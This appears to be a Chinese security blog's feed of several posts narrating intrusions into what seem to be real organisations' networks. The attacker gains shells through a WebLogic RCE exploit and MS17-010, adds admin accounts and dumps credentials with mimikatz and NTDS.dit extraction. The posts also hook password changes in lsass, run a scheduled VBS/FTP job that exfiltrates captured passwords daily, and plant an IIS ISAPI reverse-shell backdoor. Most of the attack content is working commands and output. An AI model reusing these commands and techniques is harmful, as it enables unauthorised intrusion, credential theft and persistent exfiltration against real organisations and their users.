class="line">xxxx                  Administrator            xxxx</span><br><span class="line">kxadmin                  xxxx                xxxx</span><br><span class="line"></span><br><span class="line">C:\Oracle\Middleware\user_projects\domains\bifoundation_domain&gt;nltest /dclist:Kx</span><br><span class="line">nltest /dclist:K2x</span><br><span class="line">Get list of DCs in domain &apos;Kx&apos; from &apos;\\AD1.Kx&apos;.</span><br><span class="line">    AD1.Kx [PDC]  [DS] Site: Default-First-Site-Name</span><br><span class="line">    AD2.Kx        [DS] Site: Default-First-Site-Name</span><br><span class="line">    AD3.Kx        [DS] Site: Default-First-Site-Name</span><br><span class="line"></span><br><span class="line">说明：xxxx代表的是马赛克</span><br></pre></td></tr></table></figure><p>利用<code>ping</code>命令得到域控<code>IP</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">AD1.Kx --&gt;192.168.2.225 域控</span><br><span class="line">AD2.Kx --&gt;192.168.2.215 域控</span><br><span class="line">AD3.Kx --&gt;192.168.2.245 域控</span><br></pre></td></tr></table></figure></p><p>该机子的管理员组可能存在有域管账号，如果能抓出哈希岂不是美滋滋？但是当前权限不是<code>NT AUTHORITY\SYSTEM</code>所以<code>msf加载的mimikatz是抓不出哈希的</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">C:\Oracle\Middleware\user_projects\domains\bifoundation_domain&gt;net localgroup administrators</span><br><span class="line">Members</span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Administrator</span><br><span class="line">Kx\xxxx</span><br><span class="line">Kx\xxxx</span><br><span class="line">Kx\kxadmin（可能是域管账号）</span><br><span class="line">说明：这里不能说Administrator用户为域管，因为本机默认有个adminstrator,域控默认也有1个，但这两个并不是同一个。</span><br></pre></td></tr></table></figure></p><p>提权啊</p><h4 id="迷惑点"><a href="#迷惑点" class="headerlink" title="迷惑点"></a>迷惑点</h4><p>综合上述，这里有个问题就是判断域管的时候留下的，就是执行<code>net localgroup administrators</code>显示有<code>kx\kxadmin</code>管理员用户，然后执行<code>net group &quot;domain admins&quot; /domain</code>查看域管当中也有<code>kxadmin</code>用户，这是kx\kxadmin迷惑了我（kx是域控），注意这个账号的格式是域控\账号，这里和远程登入域机器的时候输入域管账号一样，格式也是域控\账号。所以这里的<code>kx\admin</code>账号是域管的概率很大，因为它标识了。总的来说，验证的方法也很简单，就是读取<code>kx\kxadmin</code>的密码，能登入域控的话就是域管账号了。</p><h3 id="提权失败"><a href="#提权失败" class="headerlink" title="提权失败"></a>提权失败</h3><p>好久没有提权了，记得上次用<code>pr.exe</code>提了台机子还是半年前的事。</p><h4 id="Windows-Exploit-Suggester（提权辅助工具）"><a href="#Windows-Exploit-Suggester（提权辅助工具）" class="headerlink" title="Windows-Exploit-Suggester（提权辅助工具）"></a>Windows-Exploit-Suggester（提权辅助工具）</h4><p>在目标价执行systeminfo&gt;1.txt，然后将1.txt拖回本地<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python windows-exploit-suggester.py --database 2018-04-10-mssb.xls --systeminfo 1.txt</span><br></pre></td></tr></table></figure></p><p><img src="/images/Weblogic引发的血案-3/5.PNG" alt=""><br>这里只截取了一小部分的图，绿色代表可以利用的提权工具，<a href="http://www.freebuf.com/sectool/102139.html" target="_blank" rel="noopener">参考文章</a></p><h4 id="ms15-051"><a href="#ms15-051" class="headerlink" title="ms15-051"></a>ms15-051</h4><p>运行<code>ms15-051.exe</code>结果懵逼了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">C:\Oracle\Middleware\user_projects\domains\bifoundation_domain&gt;ms15-051.exe &quot;net user admin1 Qqaazz7</span><br><span class="line">41/add&quot;</span><br><span class="line">ms15-051.exe &quot;net user admin1 Qqaazz741/add&quot;</span><br><span class="line"></span><br><span class="line">C:\Oracle\Middleware\user_projects\domains\bifoundation_domain&gt;dir</span><br><span class="line"></span><br><span class="line"> Directory of C:\Oracle\Middleware\user_projects\domains\bifoundation_domain</span><br><span class="line"></span><br><span class="line">04/12/2018  06:43 AM    &lt;DIR&gt;          .</span><br><span class="line">04/12/2018  06:43 AM    &lt;DIR&gt;          ..</span><br><span class="line">11/10/2017  09:34 AM               144 edit.lok</span><br><span class="line">07/23/2016  08:17 PM               506 fileRealm.properties</span><br><span class="line">07/23/2016  08:17 PM    &lt;DIR&gt;          init-info</span><br><span class="line"></span><br><span class="line">emmmmm运行完之后，提权工具没了？！</span><br></pre></td></tr></table></figure></p><p>当时第一反应就是被杀了，再一次看了进程才发现有个<code>WRSA.exe</code>杀软，好吧，第一次遇到，没注意。<br><img src="/images/Weblogic引发的血案-3/6.PNG" alt=""><br>Webroot杀软<br><img src="/images/Weblogic引发的血案-3/7.PNG" alt=""><br>手上也没有免杀的提权工具，这就很难受了。</p><h4 id="meterpreter"><a href="#meterpreter" class="headerlink" title="meterpreter"></a>meterpreter</h4><p>用<code>msf</code>自带的试试，<code>search了几个15 16的提权模块，设置session之后 run！</code>然而并没有用，meterpreter<code>迁移进程</code>和<code>getsystem</code>也不管用<br>提权难啊提权难</p><h2 id="内网游游"><a href="#内网游游" class="headerlink" title="内网游游"></a>内网游游</h2><p>还在为提权想办法时，扫内网发现了192.168.2.245域控存在ms17-010！这次你还不死。<br><img src="/images/Weblogic引发的血案-3/8.PNG" alt=""><br>添加用户怼！<br><img src="/images/Weblogic引发的血案-3/9.PNG" alt=""></p><h3 id="远程登入"><a href="#远程登入" class="headerlink" title="远程登入"></a>远程登入</h3><p><img src="/images/Weblogic引发的血案-3/10.PNG" alt=""><br>迫不得已的时候才用这招，当时登入的时候还被挤下线了，好采对方没发觉什么。</p><h3 id="mimiktaz"><a href="#mimiktaz" class="headerlink" title="mimiktaz"></a>mimiktaz</h3><p><img src="/images/Weblogic引发的血案-3/11.PNG" alt=""><br>不是明文的，cmd5可破。</p><h3 id="Cobalt-Strike"><a href="#Cobalt-Strike" class="headerlink" title="Cobalt Strike"></a>Cobalt Strike</h3><p>利用该域控上线个<code>cs</code>然后<code>arp</code>登入一波域内机子就差不多完事了，但是死活上线不了，各种姿势都试过了，就是不给你上线，<code>exp</code>在进程里面了就是不给你上线（能通外网），刚开始以为是该域控环境有问题，所以就拿着域管登入到其他两个域控，还是不给上线，行吧，我在换多几台试试总可以了吧？换了不下十台机子，就是不给你上线，好气。最后以为是自己的<code>Cobalt Strike</code>有问题，本地运行下<code>exp</code>结果秒上线，狗噢。</p><h3 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h3><p>都说<code>Cobalt Strike</code>是<code>msf</code>的界面版，那我改用<code>msf</code>总行吧。<br>添加<code>msf</code>路由，使得<code>msf</code>能访问到目标内网，<a href="https://www.anquanke.com/post/id/86505" target="_blank" rel="noopener">参考文章</a><br><img src="/images/Weblogic引发的血案-3/12.PNG" alt=""><br>登入域里的机器，使用到的模块<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/psexec</span><br></pre></td></tr></table></figure></p><p>设置对应的<code>SMBDomain，SMBUer，SMBPass</code>，run登入。结果三台域控没上线，只上线了两台，当时忘截图了，心累。</p><h2 id="NTDS-dit文件"><a href="#NTDS-dit文件" class="headerlink" title="NTDS.dit文件"></a>NTDS.dit文件</h2><p>获取NTDS.dit文件，导出域控里全部域用户哈希。导出方式<a href="http://www.mottoin.com/90278.html" target="_blank" rel="noopener">参考文章</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32&gt;vssadmin create shadow /for=c:</span><br><span class="line">vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool</span><br><span class="line">(C) Copyright 2001-2013 Microsoft Corp.</span><br><span class="line"></span><br><span class="line">Successfully created shadow copy for &apos;c:\&apos;</span><br><span class="line">    Shadow Copy ID: &#123;b1a1be28-c02a-4402-bf80-f82b46673b03&#125;</span><br><span class="line">    Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy4</span><br><span class="line"></span><br><span class="line">C:\Windows\System32&gt;vssadmin list shadows</span><br><span class="line">vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool</span><br><span class="line">(C) Copyright 2001-2013 Microsoft Corp.</span><br><span class="line"></span><br><span class="line">Contents of shadow copy set ID: &#123;56512710-bc51-4ba7-98cc-4d1c5d7b75ae&#125;</span><br><span class="line">   Contained 1 shadow copies at creation time: 4/12/2018 2:07:02 AM</span><br><span class="line">      Shadow Copy ID: &#123;b1a1be28-c02a-4402-bf80-f82b46673b03&#125;</span><br><span class="line">         Original Volume: (C:)\\?\Volume&#123;aececd34-32d8-4d4f-9dc6-184ea98a825f&#125;\</span><br><span class="line">         Shadow Copy Volume: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy4</span><br><span class="line">         Originating Machine: AD3.Kx</span><br><span class="line">         Service Machine: AD3.Kx</span><br><span class="line">         Provider: &apos;Microsoft Software Shadow Copy provider 1.0&apos;</span><br><span class="line">         Type: ClientAccessible</span><br><span class="line">         Attributes: Persistent, Client-accessible, No auto release, No writers, Differential</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\Windows\System32&gt;copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy4\windows\NTDS\NTDS.dit c:\</span><br><span class="line">        1 file(s) copied.</span><br><span class="line"></span><br><span class="line">C:\Windows\System32&gt;copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy4\windows\system32\config\system c:\</span><br><span class="line">        1 file(s) copied.</span><br><span class="line"></span><br><span class="line">C:\Windows\System32&gt;copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy4\windows\system32\config\sam c:\</span><br><span class="line">        1 file(s) copied.</span><br></pre></td></tr></table></figure></p><p>将<code>NTDS.dit，system，sam</code> 三个文件拖回<code>kali</code>里，<code>DUMP NTDS.dit文件</code><a href="http://www.freebuf.com/articles/system/151463.html" target="_blank" rel="noopener">参考文章</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python secretsdump.py -ntds /root/ntds_cracking/ntds.dit -system /root/ntds_cracking/SYSTEM LOCAL</span><br></pre></td></tr></table></figure></p><p>说明：这里一定要在/root/下创建<code>ntds_cracking</code>目录然后将<code>ntds.dit</code>放到该目录，路径是/root/ntds_cracking/ntds.dit 不然会报错。<br><img src="/images/Weblogic引发的血案-3/13.PNG" alt=""><br>这已经是第三章了，过不了多久会出第四第五章，也有可能第四章是终章，很多技术都没用到，比如<code>MS14-068</code>漏洞，假令牌，金票据，如何猥琐得到域管账号，从工作组到域渗透，很多很多，接下来的日子在慢慢写，当然了，这也是学习技术的过程。<br>老规矩，擦屁股走人~</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;无状态&lt;br&gt;
    
    </summary>
    
      <category term="web安全" scheme="OneHone.github.io/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Weblogic漏洞" scheme="OneHone.github.io/tags/Weblogic%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="后门" scheme="OneHone.github.io/tags/%E5%90%8E%E9%97%A8/"/>
    
  </entry>
  
  <entry>
    <title>Weblogic引发的血案-2</title>
    <link href="OneHone.github.io/2018/04/03/Weblogic%E5%BC%95%E5%8F%91%E7%9A%84%E8%A1%80%E6%A1%88-2/"/>
    <id>OneHone.github.io/2018/04/03/Weblogic引发的血案-2/</id>
    <published>2018-04-03T11:52:46.000Z</published>
    <updated>2018-04-04T05:48:39.351Z</updated>
    
    <content type="html"><![CDATA[<p>Somebody I can kiss，I want something just like this.<br><a id="more"></a><br>直接用<code>WebLogic_Wls-Wsat_RCE_Exp.jar</code>exp获取到shell，和上一篇文章一样。</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">hostname --&gt;OXXX</span><br><span class="line">systeminfo --&gt;Windows Serverr 2008 Standard x64</span><br><span class="line">ipconfig --&gt;192.168.101.3</span><br><span class="line">whoami &amp; net localgroup administrators --&gt;得知当前用户不是管理员组</span><br><span class="line">tasklist --&gt;微软自带杀软 MsMpEng.exe 202个补丁</span><br><span class="line">所属域 --&gt;ALxxx</span><br><span class="line">无视xxx</span><br></pre></td></tr></table></figure><p><img src="/images/Weblogic引发的血案-2/1.PNG" alt=""></p><h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h2><p>此杀软，用<code>Veil免杀</code>生成<code>msf</code>的<code>exp</code>就能过。利用<code>bitsadmin</code>命令将<code>exp</code>上传到目标机。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin /transfer n http://xxx.xxx.xxx/xxx.exe C:\xxx\xxx.exe</span><br></pre></td></tr></table></figure></p><p><img src="/images/Weblogic引发的血案-2/2.PNG" alt=""><br>运行<code>exp</code>，然后在<code>msf</code>上监听得到<code>shell</code><br><img src="/images/Weblogic引发的血案-2/3.PNG" alt=""><br>cs也来客串一下<br><img src="/images/Weblogic引发的血案-2/4.PNG" alt=""><br>因为不是系统权限，所以尝试了<code>getsystem</code>命令提权，发现报错，<code>mimikatz</code>也抓不出哈希，于是就收集了域信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net group 查看组名</span><br><span class="line">net group &quot;domain admins&quot; /domain 查看域管理员</span><br><span class="line">nltest /dclist:ALxxx 查看域控</span><br></pre></td></tr></table></figure></p><p><img src="/images/Weblogic引发的血案-2/5.PNG" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SRxx --&gt;192.168.101.1 域控</span><br><span class="line">SRxxx --&gt;192.168.101.8 域控</span><br><span class="line">GBxxx --&gt;192.168.121.1 域控</span><br></pre></td></tr></table></figure></p><h2 id="内网游游"><a href="#内网游游" class="headerlink" title="内网游游"></a>内网游游</h2><p>内网渗透的本质是收集信息 –某大牛<br>现在已掌握的信息如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">拿下了192.168.101.3（不完全控制，因为不是最高权限，也不打算往提权方面走，因为我懒）</span><br><span class="line">明确域管和域控</span><br></pre></td></tr></table></figure></p><p>利用<code>x.3</code>机子作为代理机子，这里用到的是<code>ew.exe</code>，代理访问内网。</p><h3 id="ms17-010"><a href="#ms17-010" class="headerlink" title="ms17-010"></a>ms17-010</h3><p>似乎代理进内网第一件事情就是扫<code>445端口</code>了<br><img src="/images/Weblogic引发的血案-2/6.PNG" alt=""><br>运气不错，发现域控<code>192.168.101.8</code>存在<code>445漏洞</code>，<code>msf</code>里的<code>ms17-010</code>的利用工具有四个，一个扫描漏洞，一个任意执行命令，两个反弹<code>meterpreter</code>的<code>shell</code>，这里只能用<code>auxiliary/admin/smb/ms17_010_command</code>这模块的，也就是任意执行命令<br>想执行命令上传马儿的，但是<code>powershell</code>和<code>bitsadmin</code>命令执行完后各种报错上传不成功，也试过<code>cs</code>各种<code>exp</code>也弹不回来<code>shell</code>，于是添加管理员用户远程链接之<br><img src="/images/Weblogic引发的血案-2/7.PNG" alt=""><br>上去后发现，原来机子不通外网，难怪之前的马儿回不来。。</p><h3 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h3><p>将域控里的管理员密码全部dump出来<br><img src="/images/Weblogic引发的血案-2/8.PNG" alt=""><br>接下来可以拿着域管的账号登入到域里机子了，先尝试登入其他两个域控，运气不错，该域管也属于这两个域控的<br><img src="/images/Weblogic引发的血案-2/9.PNG" alt=""><br><img src="/images/Weblogic引发的血案-2/10.PNG" alt=""><br>域控都是不通外网的，擦屁股溜了~</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Somebody I can kiss，I want something just like this.&lt;br&gt;
    
    </summary>
    
      <category term="web安全" scheme="OneHone.github.io/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Weblogic漏洞" scheme="OneHone.github.io/tags/Weblogic%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="后门" scheme="OneHone.github.io/tags/%E5%90%8E%E9%97%A8/"/>
    
  </entry>
  
  <entry>
    <title>Weblogic引发的血案</title>
    <link href="OneHone.github.io/2018/03/29/Weblogic%E5%BC%95%E5%8F%91%E7%9A%84%E8%A1%80%E6%A1%88/"/>
    <id>OneHone.github.io/2018/03/29/Weblogic引发的血案/</id>
    <published>2018-03-29T11:49:27.000Z</published>
    <updated>2018-03-30T02:23:19.067Z</updated>
    
    <content type="html"><![CDATA[<p>珍惜每一刻。<br><a id="more"></a><br>在某次测试中发现了某某站点开了<code>7001端口</code>的<code>Weblogic</code>服务，于是。。。</p><h2 id="漏洞验证与利用"><a href="#漏洞验证与利用" class="headerlink" title="漏洞验证与利用"></a>漏洞验证与利用</h2><p><img src="/images/Weblogic引发的血案/1.PNG" alt=""><br>运用<code>payload</code>向其写入<code>shell</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop/Oracle-WebLogic-CVE-2017-10271-master# java -jar WebLogic_Wls-Wsat_RCE_Exp.jar http://xxx.xxx.xxx:7001 abc.jsp</span><br><span class="line"></span><br><span class="line">[*] Starting exploit...</span><br><span class="line">[*] Sending payloads...</span><br><span class="line">[*] Payloads sent...</span><br><span class="line">[*] Opening shell...</span><br><span class="line">[*] pwned! Go ahead...</span><br><span class="line"></span><br><span class="line">[+] http://xxx.xxx.xxx:7001/bea_wls_internal/abc.jsp?password=secfree&amp;command=whoami</span><br></pre></td></tr></table></figure><p>这里请无视（xxx）</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>访问<code>shell</code>地址执行命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">whoami --&gt;xxx\admin</span><br><span class="line">ipconfig --&gt;公网地址</span><br><span class="line">sysinfo --&gt;win2008x64 R2 EN 工作组 257个补丁</span><br><span class="line">net localgroup administrators --&gt; 得知当前用户（admin）是管理组</span><br><span class="line">tasklist --&gt;杀软卡巴斯基（avp.exe）</span><br></pre></td></tr></table></figure></p><p><img src="/images/Weblogic引发的血案/2.PNG" alt=""><br>执行<code>netstat -ano</code>看下端口，发现没有开启3389端口。但这不是绝对的，有些可爱的管理员会把3389端口改成别的端口，进行远程链接。所以要想知道真正的远程端口链接是多少需执行<code>tasklist /svc</code>命令，查看<code>svchost.exe</code>对应的<code>TermService</code>的<code>pid</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">svchost.exe  3788 TermService</span><br></pre></td></tr></table></figure></p><p>查看对应的PID，得知远程链接端口为39800<br><img src="/images/Weblogic引发的血案/3.PNG" alt=""></p><h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user admin1 Qww123!/add&amp;net localgoup administrators admin1 /add</span><br></pre></td></tr></table></figure><p>链接远程端口之！<br><img src="/images/Weblogic引发的血案/4.PNG" alt=""><br>emmm什么时候冒出了一个熊猫卫士清理工具？？<br>好吧。<br>这杀软环境挺让人绝望的，光是卡巴就够呛还来个熊猫帮手<br>较新版本的<code>卡巴</code>对<code>lsass</code>进程全面封锁，进程是动不了的，但幸运的是，该机子的卡巴是旧版本，而且病毒库也不更新，得利于管理员的懒惰，成功将它的<code>lsass</code>进程创建为转储文件<code>lsass.DMP</code>，并把它拖回本地<code>dump</code><br><code>mimikatz</code>获取到管理员密码<br><img src="/images/Weblogic引发的血案/5.PNG" alt=""></p><h2 id="巩固"><a href="#巩固" class="headerlink" title="巩固"></a>巩固</h2><p>都已经拿到管理员密码了，你还想怎样？没错，我不仅要拿你的密码，就算你修改新的密码，我也要知道！<br>准备<code>HookPasswordChange.dll</code>和<code>Invoke-ReflectivePEInjection.ps1</code>文件，然后运行该<code>powershell</code>脚本将<code>dll</code>注入到<code>lsass</code>进程中。利用方法文章结束后有相关链接<br>将准备好的文件丢进目标机子，执行命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell –exec bypass –Command &quot;&amp; &#123;Import-Module &apos;C:\Invoke-ReflectivePEInjection.ps1&apos;;Invoke-ReflectivePEInjection -PEPath C:\HookPasswordChange.dll –procname lsass&#125;&quot;</span><br></pre></td></tr></table></figure></p><p><img src="/images/Weblogic引发的血案/6.PNG" alt=""><br>成功安装，当管理员修改密码的时候会记录下新的密码，且以文本的形式保存在<code>c:\windows\temp\passwords.txt</code><br>因为管理员没有这么快改密码，所以自己就创建一个管理员用户，并修改密码做测试<br><img src="/images/Weblogic引发的血案/7.PNG" alt=""><br>OK，没问题</p><h2 id="传输"><a href="#传输" class="headerlink" title="传输"></a>传输</h2><p>实际过程中如果管理员修改了密码，我们是要将<code>passwords.txt</code>传送出来的。<br>方法有很多，这里就用个简单的<code>FTP</code>上传文件的方式，将文件发送到<code>FTP</code>服务器<br>将VBS脚本放到任务计划书里，按时执行，VBS代码如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Set ws = CreateObject(&quot;Wscript.Shell&quot;)</span><br><span class="line">ws.run &quot;cmd /c ftp -s:E:\xxx\ftp.txt&quot;,vbhide</span><br></pre></td></tr></table></figure></p><p>ftp.txt内容为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">open xxx.xxx.xxx.xxx</span><br><span class="line">ppp</span><br><span class="line">123456</span><br><span class="line">put c:\windows\temp\passwords.txt</span><br><span class="line">bye</span><br></pre></td></tr></table></figure></p><p>继续忽略xxx<br>但是，目标机子运行FTP xxx.xxx.xxx.xxx（xxx为FTP服务器的IP）报错：访问被拒绝<br><img src="/images/Weblogic引发的血案/8.PNG" alt=""><br>可能是卡巴惹的祸吧，没有深究，自己上传个<code>ftp.exe</code>上去运行<br><img src="/images/Weblogic引发的血案/9.PNG" alt=""><br>成功链接到<code>FTP</code>服务器<br>在任务计划书里定时一天发送一次，搞定。</p><h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>WebLogic Payload:<a href="https://github.com/iBearcat/Oracle-WebLogic-CVE-2017-10271" target="_blank" rel="noopener">https://github.com/iBearcat/Oracle-WebLogic-CVE-2017-10271</a><br>HookPasswordChange:<a href="http://wooyun.jozxing.cc/static/drops/tips-13079.html" target="_blank" rel="noopener">http://wooyun.jozxing.cc/static/drops/tips-13079.html</a><br>溜了~</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;珍惜每一刻。&lt;br&gt;
    
    </summary>
    
      <category term="web安全" scheme="OneHone.github.io/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Weblogic漏洞" scheme="OneHone.github.io/tags/Weblogic%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="后门" scheme="OneHone.github.io/tags/%E5%90%8E%E9%97%A8/"/>
    
  </entry>
  
  <entry>
    <title>iis6.x后门isapi测试</title>
    <link href="OneHone.github.io/2018/03/26/iis6.x%E5%90%8E%E9%97%A8isapi%E6%B5%8B%E8%AF%95/"/>
    <id>OneHone.github.io/2018/03/26/iis6.x后门isapi测试/</id>
    <published>2018-03-26T07:37:31.000Z</published>
    <updated>2018-03-29T12:27:24.256Z</updated>
    
    <content type="html"><![CDATA[<p>我就是爱吃醋，就是爱吃醋。<br><a id="more"></a><br>访问网页，就弹<code>shell</code>？唔哟<br>本地复现了一款<code>micropoor</code>大牛的后门，文章结束附上下载链接。</p><h2 id="配置环境"><a href="#配置环境" class="headerlink" title="配置环境"></a>配置环境</h2><p>靶机环境：IP：192.11.22.88 <code>win 2003 Enterprise 32位</code> <code>iis6.x</code><br>攻击机：IP：192.11.22.55 <code>win 7</code><br>打开<code>internet信息服务（IIS）管理器</code>找到默认网站右键点击属性，点击<code>ISAPI筛选器</code>添加<code>iis_x86.dll</code>dll文件。<br><img src="/images/iis6.x后门isapi测试/1.PNG" alt=""></p><h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h2><p>攻击机用<code>nc</code>监听端口，执行命令<code>nc.exe -lvvp 80</code><br>修改User agent内容，这里以谷歌浏览器为例，点击<code>More tools</code>然后选中<code>Network conditions</code><br><img src="/images/iis6.x后门isapi测试/2.PNG" alt=""><br>将User agent的内容改为：<code>micropoor_iis:192.11.22.55:80</code> 注：填本机IP<br><img src="/images/iis6.x后门isapi测试/3.PNG" alt=""><br>然后访问网站，成功反弹<code>shell</code><br><img src="/images/iis6.x后门isapi测试/4.PNG" alt=""></p><p>强大的后门！</p><h2 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h2><p>大牛博客：<code>micropoor.blogspot.com</code><br>32位dll下载：<code>https://drive.google.com/file/d/1-dKhidlBXg3YZ144fejY8FPaYl2KX3Ot/view</code><br>64位dll下载：<code>https://drive.google.com/file/d/1M5hh2IQsnb_sJwIAkOHIJecarcp2FDhL/view</code><br>下之前挂个代理，不然访问不到。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;我就是爱吃醋，就是爱吃醋。&lt;br&gt;
    
    </summary>
    
      <category term="后门" scheme="OneHone.github.io/categories/%E5%90%8E%E9%97%A8/"/>
    
    
      <category term="windows后门" scheme="OneHone.github.io/tags/windows%E5%90%8E%E9%97%A8/"/>
    
      <category term="iis6.x" scheme="OneHone.github.io/tags/iis6-x/"/>
    
  </entry>
  
  <entry>
    <title>Veil3.1免杀安装</title>
    <link href="OneHone.github.io/2018/03/23/Veil3.1%E5%85%8D%E6%9D%80%E5%AE%89%E8%A3%85/"/>
    <id>OneHone.github.io/2018/03/23/Veil3.1免杀安装/</id>
    <published>2018-03-23T05:17:08.000Z</published>
    <updated>2018-03-29T12:27:27.300Z</updated>
    
    <content type="html"><![CDATA[<p>听说很难安装。<br><a id="more"></a></p><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>下载最新3.1版本的<code>Veil</code><br>Github：<code>https://github.com/Veil-Framework/Veil.git</code></p><h2 id="配置环境"><a href="#配置环境" class="headerlink" title="配置环境"></a>配置环境</h2><p>安装之前先更新一下包，执行命令<code>apt-get update</code><br>下载配置<code>Veil</code>所需的包，不然会报错，在终端输入：<br><code>apt-get install libncurses5*</code><br><code>apt-get install libavutil55*</code><br><code>apt-get install gcc-mingw-w64*</code><br><code>apt-get install wine32</code><br>如果下载失败就挂个代理，应该没什么问题。<br>这里要说的是红酒瓶<code>wine</code>，如果安装失败就使用如下三条命令：<code>dpkg --add-architecture i386</code> <code>apt-get update</code> <code>apt-get install wine32</code></p><p>输入命令<code>wine --version</code>查看是否安装成功。<br><img src="/images/Veil3.1免杀安装/1.PNG" alt=""></p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>解压Veil安装包<code>unzip Veil-master.zip</code>，<code>cd</code>到<code>Veil-master/setup</code>目录运行./setup.sh   <code>y</code>回车<br><img src="/images/Veil3.1免杀安装/2.PNG" alt=""><br>安装需要点时间，喝杯水。</p><p>紧接着，一直疯狂的按<code>next</code>，让它安装。<br><img src="/images/Veil3.1免杀安装/3.PNG" 